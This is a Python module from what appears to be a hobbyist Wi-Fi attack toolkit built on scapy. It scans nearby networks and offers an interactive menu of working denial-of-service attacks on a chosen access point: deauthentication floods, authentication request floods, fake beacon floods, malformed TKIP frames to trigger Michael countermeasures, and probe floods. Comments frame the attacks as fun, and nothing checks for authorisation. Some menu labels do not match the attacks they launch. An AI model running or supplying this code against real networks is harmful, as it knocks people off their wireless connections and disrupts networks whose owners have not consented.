# wifi_module.py
import os
import sys
import time
import signal
import threading
import subprocess
from scapy.all import *
from scapy.all import Dot11, Dot11Beacon, Dot11Elt, sniff
from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, Dot11Auth, Dot11ProbeReq, Dot11QoS, Raw, sendp

from scapy.layers.dot11 import *
_this_dir = os.path.dirname(os.path.abspath(__file__))
_parent_dir = os.path.dirname(_this_dir)
for _p in [_parent_dir, _this_dir]:
    if _p not in sys.path:
        sys.path.insert(0, _p)

import banner
from debugs import debug

# i mean it seems more fun making my own attacks than rely on mdk4
# so why not do it :D if it works it works
class AttackModule:
    def __init__(self):
        pass
    def deauth_all(access_point, interface):
        packet = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", 
                        addr2=access_point,
                        addr3=access_point)/ Dot11Deauth(reason=7)
        debug("info", "Starting deauth attack... Press Ctrl+C to stop.")
        while True:
            try:
                sendp(packet, inter=0.01, count=5, 
                    iface=interface, verbose=0)
            except KeyboardInterrupt:
                debug("info", "Deauth attack interrupted by user")
                break
            except Exception as e:
                debug("critical", f"Deauth packet send failed: {e}")
                time.sleep(0.1)
                break
    
    def auth_dos(interface, target_bssid, channel, pps=10000, duration=0):
        duration_label = 'infinite' if duration <= 0 else f'{duration}s'
        debug("info", f"[*] Authentication DoS Attack")
        debug("info", f"[*] Target: {target_bssid} | Channel: {channel}")
        debug("info", f"[*] Speed: {pps} pps | Duration: {duration_label}")
        
        # Set channel
        os.system(f"iw dev {interface} set channel {channel}")
        time.sleep(0.5)
        
        debug("info", "[*] Flooding with authentication requests...")
        
        sent = 0
        start_time = time.time()
        
        try:
            while duration <= 0 or time.time() - start_time < duration:
                # Generate random client MAC
                client_mac = "02:%02x:%02x:%02x:%02x:%02x" % (
                    random.randint(0, 255), random.randint(0, 255),
                    random.randint(0, 255), random.randint(0, 255),
                    random.randint(0, 255)
                )
                
                packet = RadioTap() / Dot11(
                    type=0,
                    subtype=11,
                    addr1=target_bssid,
                    addr2=client_mac,
                    addr3=target_bssid
                ) / Dot11Auth(
                    algo=0,
                    seqnum=1,
                    status=0
                )
                
                # Send burst
                sendp(packet, iface=interface, count=100, inter=0, verbose=0)
                sent += 100
                
                # Progress
                if sent % 10000 == 0:
                    elapsed = time.time() - start_time
                    rate = sent / elapsed if elapsed > 0 else 0
                    debug("info", f"[*] Sent: {sent} ({rate:.0f} pps)")
            
            if duration > 0:
                elapsed = time.time() - start_time
                debug("ok", f"[+] Attack complete! Sent {sent} packets in {elapsed:.1f}s")
            
        except KeyboardInterrupt:
            debug("info", f"\n[!] Stopped. Sent {sent} packets")

    def access_point_flood(self, interface, count=200):
        noise_chars = string.punctuation
        supported_rates = b'\x82\x84\x8b\x96'
        debug("info", f"Starting AP flood on {interface} with APs...")
        debug("info", "AP Flood Running... Press Ctrl+C to stop.")
        self.stop_sniff = False

        while not self.stop_sniff:
            packet_batch = []
            for i in range(count):
                if self.stop_sniff:
                    break
                ssid = ''.join(random.choice(noise_chars) for _ in range(random.randint(12, 24)))
                mac = ':'.join('%02x' % random.randint(0, 255) for _ in range(6))
                channel = random.randint(1, 11)
                packet = (
                    RadioTap() /
                    Dot11(type=0, subtype=8, addr1="FF:FF:FF:FF:FF:FF", addr2=mac, addr3=mac) /
                    Dot11Beacon(cap=0x0411) /
                    Dot11Elt(ID="SSID", info=ssid.encode('utf-8')) /
                    Dot11Elt(ID="Rates", info=supported_rates) /
                    Dot11Elt(ID="DSset", info=bytes([channel]))
                )
                packet_batch.append(packet)

            if self.stop_sniff:
                break

            try:
                sendp(packet_batch, inter=0.0002, iface=interface, verbose=0)
                sendp(packet_batch, inter=0.0002, iface=interface, verbose=0)
                sendp(packet_batch, inter=0.0002, iface=interface, verbose=0)
            except KeyboardInterrupt:
                debug("info", "AP flood interrupted by user")
                return

            if self.stop_sniff:
                break

            time.sleep(0.0005)
        debug("info", "AP flood stopped.")

    def michael_mic_dos(interface, target_bssid, channel, total_packets=0, pps=100000):
        debug("info", f"[*] Michael MIC Attack")
        debug("info", f"[*] Target: {target_bssid} | Channel: {channel}")
        debug("info", f"[*] Total packets: {'infinite' if total_packets <= 0 else total_packets} | Speed: {pps} pps")

        # Set channel
        os.system(f"iw dev {interface} set channel {channel}")
        time.sleep(0.5)
        
        # Calculate delay between packets
        inter = 1.0 / pps if pps > 0 else 0.00001
        
        # Fake client MAC
        client_mac = "02:00:00:00:00:01"
        
        # Build malformed QoS frame with invalid TKIP MIC
        packet = RadioTap() / Dot11(
            type=2,           # Data frame
            subtype=8,        # QoS Data
            FCfield=0x41,
            addr1=target_bssid,
            addr2=client_mac,
            addr3=target_bssid
        ) / Dot11QoS(TID=0) / Raw(
            b"\x00\x00\x00\x20"
            + b"\x00\x00\x00\x00"
            + b"\xff" * 20
            + b"\xaa\xbb\xcc\xdd"
        )
        
        debug("info", "[*] Sending malformed TKIP frames...")
        
        sent = 0
        start_time = time.time()
        
        try:
            while True:
                if total_packets > 0 and sent >= total_packets:
                    break
                chunk_size = 100 if total_packets <= 0 else min(100, total_packets - sent)
                for _ in range(chunk_size):
                    sendp(packet, iface=interface, count=1, inter=inter, verbose=0)
                    sent += 1
                
                # Progress update
                if sent % 100000 == 0:
                    elapsed = time.time() - start_time
                    total_text = 'infinite' if total_packets <= 0 else total_packets
                    rate = sent / elapsed if elapsed > 0 else 0
                    print(f"[*] Sent: {sent}/{total_text} ({rate:.0f} pps)")
            
            if total_packets > 0:
                elapsed = time.time() - start_time
                print(f"[+] Attack complete! Sent {sent} packets in {elapsed:.1f}s")
            
        except KeyboardInterrupt:
            debug("info", f"Attack Ended by user. Total packets sent: {sent}")
    
    def probe_dos(interface, channel):
        pps = input("Packets per second (default 1000): ").strip()
        try:
            pps = int(pps) if pps else 1000
        except ValueError:
            debug("warn", "Invalid input for pps, using default 1000")
            pps = 1000
        from core.probe_flood import probe_dos
        debug("ok", f"Starting Probe Flood DoS with {pps} pps... Press Ctrl+C to stop.")
        try:
            probe_dos(interface, channel, pps)
        except KeyboardInterrupt:
            debug("info", "Probe Flood DoS interrupted by user")
        except Exception as e:
            debug("critical", f"Probe Flood DoS error: {e}")
class ModuleSetup:
    def __init__(self):
        self.networks = {}
        self.stop_sniff = False
        self.scan_threads = []
        self.monitor_mode_enabled = False
        self.original_interface = None
        self.interface = None

    def cleanup_monitor_mode(self):
        if not self.monitor_mode_enabled:
            return
        
        debug("info", "Cleaning up monitor mode...")
        
        try:
            if self.interface:
                debug("info", f"Stopping monitor mode on {self.interface}")
                
                subprocess.run(["ip", "link", "set", self.interface, "down"], capture_output=True, timeout=5)
                subprocess.run(["iw", "dev", self.interface, "set", "type", "managed"], capture_output=True, timeout=5)
                subprocess.run(["ip", "link", "set", self.interface, "up"], capture_output=True, timeout=5)
            
            nm_status = subprocess.run(
                ["systemctl", "is-active", "NetworkManager"],
                capture_output=True,
                text=True
            )
            
            if nm_status.stdout.strip() != "active":
                debug("info", "Restarting NetworkManager...")
                os.system("systemctl start NetworkManager > /dev/null 2>&1")
            
            self.monitor_mode_enabled = False
            debug("ok", "Monitor mode disabled successfully")
        except Exception as e:
            debug("error", f"Error during cleanup: {e}")

    def enable_monitor_mode(self, interface):
        debug("info", f"Enabling monitor mode on {interface}...")
        
        try:
            result = subprocess.run(
                ["iwconfig", interface],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if "Mode:Monitor" in result.stdout:
                debug("ok", f"{interface} already in monitor mode")
                self.monitor_mode_enabled = True
                return interface
            
            self.original_interface = interface
            
            
            result = subprocess.run(
                ["iw", "dev", interface, "set", "type", "monitor"],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                subprocess.run(["ip", "link", "set", interface, "up"], capture_output=True, timeout=5)
                debug("ok", f"Monitor mode enabled on {interface}")
                self.monitor_mode_enabled = True
                return interface
            else:
                debug("warn", "Failed to set monitor mode directly, trying airmon-ng...")
                result = subprocess.run(
                    ["airmon-ng", "start", interface],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                
                if result.returncode == 0:
                    debug("ok", f"Monitor mode enabled on {interface}")
                    self.monitor_mode_enabled = True
                    return interface
                else:
                    debug("warn", "Could not confirm monitor mode, trying anyway...")
                    self.monitor_mode_enabled = True
                    return interface
            
        except Exception as e:
            debug("critical", f"Monitor mode failed: {e}")

    def signal_handler(self, sig, frame):
        self.stop_sniff = True
        debug("warn", "Stopping scan...")

    def restore_default_signal(self):
        signal.signal(signal.SIGINT, signal.default_int_handler)

    def packet_handler(self, pkt):
        if pkt.haslayer(Dot11Beacon):
            raw_bssid = pkt[Dot11].addr2
            if not raw_bssid:
                return
            bssid = raw_bssid.upper()
            ssid = pkt[Dot11Elt].info.decode(errors="ignore")

            channel = None
            dsset = pkt.getlayer(Dot11Elt, ID=3)
            if dsset:
                try:
                    channel = dsset.info[0]
                except Exception:
                    pass

            if bssid not in self.networks:
                self.networks[bssid] = {"ssid": ssid, "channel": channel}
                print(f"{ssid or '<Hidden>'} - {bssid} (Ch {channel or '?'})")

    def set_channel(self, channel):
        try:
            subprocess.run(
                ["iw", "dev", self.interface, "set", "channel", str(channel)],
                capture_output=True,
                timeout=2,
                check=False
            )
        except Exception:
            pass

    def scan_worker(self):
        debug("info", f"Scan worker started on {self.interface}")
        packet_count = 0
        
        while not self.stop_sniff:
            try:
                pkts = sniff(iface=self.interface, prn=self.packet_handler, timeout=2, store=False)
                packet_count += 1
                
                if packet_count % 10 == 0 and len(self.networks) > 0:
                    debug("info", f"Scanning... {len(self.networks)} networks found")
                    
            except ValueError as e:
                debug("critical", f"Interface error: {e}")
                break
            except PermissionError:
                debug("critical", "Permission denied. Please run with sudo")
                break
            except OSError as e:
                debug("critical", f"OS Error: {e}. Check if interface exists and is in monitor mode")
                break
            except Exception as e:
                debug("error", f"Scan error: {e}")
                time.sleep(1)
        
        debug("info", "Scan worker stopped")

    def channel_hopper(self, channels, delay):
        debug("info", f"Channel hopper started on {self.interface}")
        hop_count = 0
        
        while not self.stop_sniff:
            for ch in channels:
                if self.stop_sniff:
                    break
                self.set_channel(ch)
                time.sleep(delay)
                hop_count += 1
                
                if hop_count % 50 == 0:
                    debug("info", f"Hopping... currently on channel ~{ch}")
        
        debug("info", "Channel hopper stopped")

    def start_channel_hop_scan(self):
        self.stop_sniff = False
        self.scan_threads = []
        
        channels_24 = list(range(1, 14))
        channels_5 = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165]
        channels = channels_24 + channels_5

        t_hopper = threading.Thread(target=self.channel_hopper, args=(channels, 0.3))
        t_sniff = threading.Thread(target=self.scan_worker)
        self.scan_threads.extend([t_hopper, t_sniff])

        for t in self.scan_threads:
            t.daemon = True
            t.start()

        time.sleep(1)
        debug("ok", "Threads started, scanning in progress...")

        while not self.stop_sniff:
            time.sleep(0.1)

        debug("info", "Waiting for threads to finish...")
        for t in self.scan_threads:
            t.join(timeout=3)
        
    def wifi_attack_menu(self, chosen_bssid, ssid):
        self.restore_default_signal()
        while True:
            os.system("clear")
            channel = self.networks.get(chosen_bssid, {}).get("channel")
            banner.wifi_attack()
            print(f"\nTarget Network: {ssid or '<Hidden>'}")
            print(f"BSSID: {chosen_bssid}")
            print(f"Channel: {channel or '?'}")
            print(f"\nAttack Modes Available:")
            print("1. Authentication Denial of Service")
            print("2. Michael Countermeasures DoS")
            print("3. Probe Flood DoS")
            print("4. Deauth Denial of Service")
            print("0. Exit")
            atkmode = input("\nAttack Mode: ")

            if atkmode == "0":
                break
            elif atkmode == "1" or atkmode.lower() == "authentication denial of service":
                AttackModule.auth_dos(self.interface, chosen_bssid, channel)
            elif atkmode == "2" or atkmode.lower() == "michael countermeasures dos":
                AttackModule.michael_mic_dos(self.interface, chosen_bssid, channel)
            elif atkmode == "3" or atkmode.lower() == "deauth denial of service":
                AttackModule.deauth_all(chosen_bssid, self.interface)
            elif atkmode == "4" or atkmode.lower() == "probe flood dos":
                try: channel = int(channel)
                except (ValueError, TypeError): debug("warn", "Invalid channel detected. please enter channel manually")
                while True:
                    try: channel = int(input("Target Channel: ")); break
                    except ValueError: debug("warn", "Still an Invalid channel")
                AttackModule.probe_dos(self.interface, channel)
    def run(self):
        try:
            signal.signal(signal.SIGINT, self.signal_handler)
            
            self.interface = input("Which WiFi interface to use: ")
            
            self.interface = self.enable_monitor_mode(self.interface)

            # Mode selection: right after interface is confirmed
            print("\nWhat would you like to do?")
            print("1. Scan Networks and Attack")
            print("2. Other Attacks (no scan needed)")
            print("0. Exit")
            mode = input("\nMode: ").strip()

            if mode == "0":
                debug("info", "Exiting...")
                return
            elif mode == "2" or mode.lower() == "other attacks":
                banner.other_attacks()
                print("1. Network Flood")
                print("2. Probe Flood DoS")
                print("0. Back")
                others = input("\nAttack Mode: ").strip()

                if others == "0":
                    return
                elif others == "1" or others.lower() == "network flood":
                    AttackModule.access_point_flood(self, self.interface)
                elif others == "2" or others.lower() == "probe flood dos":
                    try: pchannel = int(input("Target Channel: "))
                    except ValueError: debug("warn", "Invalid channel")
                    AttackModule.probe_dos(self.interface, pchannel)
            # Normal mode with scan, youll enjoy these cause yes
            # now go have fun
            debug("info", "Scanning for networks using DUAL BAND mode...")
            debug("info", "Starting channel hopping... Press Ctrl+C to stop.")
            debug("info", "If no networks appear after 30 seconds, press Ctrl+C and check your interface")
            time.sleep(2)
            self.start_channel_hop_scan()
            
            debug("info", "All networks found:")
            if not self.networks:
                debug("critical", "No networks detected. This could mean:")
                debug("error", "1. Your wireless card doesn't support monitor mode properly")
                debug("error", "2. The interface is not in monitor mode")
                debug("error", "3. There are no WiFi networks in range")
                debug("error", "4. You need to run with sudo")
            else:
                for i, (bssid, info) in enumerate(self.networks.items(), 1):
                    ssid = info["ssid"] or "<Hidden>"
                    ch = info["channel"] or "?"
                    print(f"{i}) {ssid} - {bssid} (Ch {ch})")

                pick = int(input("Pick a network number: "))
                chosen_bssid = list(self.networks.keys())[pick - 1]
                chosen_info = self.networks[chosen_bssid]
                chosen_ssid = chosen_info["ssid"]
                chosen_channel = chosen_info["channel"]

                debug("ok", f"Selected BSSID: {chosen_bssid}")
                debug("info", f"SSID: {chosen_ssid or '<Hidden>'}")
                debug("info", f"Channel: {chosen_channel or '?'}")

                startatk = input("\nStart Attack Mode? (y/n): ")
                if startatk.lower() in ["y", "yes"]:
                    debug("info", "Starting Attack Mode...")
                    self.wifi_attack_menu(chosen_bssid, chosen_ssid)
                else:
                    debug("info", "Exiting...")
        
        except KeyboardInterrupt:
            debug("warn", "Interrupted by user")
        except Exception as e:
            debug("error", f"Error: {e}")
        finally:
            self.cleanup_monitor_mode()
            debug("ok", "WiFi module cleanup complete.")